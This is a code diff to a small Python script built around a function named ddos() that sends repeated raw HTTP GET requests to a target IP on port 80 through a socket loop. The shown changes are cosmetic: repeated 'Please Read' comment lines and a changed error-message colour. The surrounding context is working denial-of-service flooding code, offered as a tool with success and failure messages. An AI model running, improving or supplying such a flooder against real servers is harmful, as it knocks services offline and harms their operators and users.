@@ -5,6 +5,14 @@ import sys
 import time
 
 # Please Read  : READMEPLEASE.md
+# Please Read  : READMEPLEASE.md
+# Please Read  : READMEPLEASE.md
+# Please Read  : READMEPLEASE.md
+# Please Read  : READMEPLEASE.md
+# Please Read  : READMEPLEASE.md
+# Please Read  : READMEPLEASE.md
+# Please Read  : READMEPLEASE.md
+
 
 port = 80
 messages = 'hello its me'
@@ -42,7 +50,7 @@ def ddos():
           mysocket.sendto(str.encode("GET " + message + "HTTP/1.1 \r\n"), (ip, port))
           print("\033[1;32;40m\nSuccess!")
       except socket.error:
-            print("\033[1;32;40m\nFailed Connection killed!, please wait....")
+            print("\033[1;31;40m\nFailed Connection killed!, please wait....")
             
             mysocket.close()
 
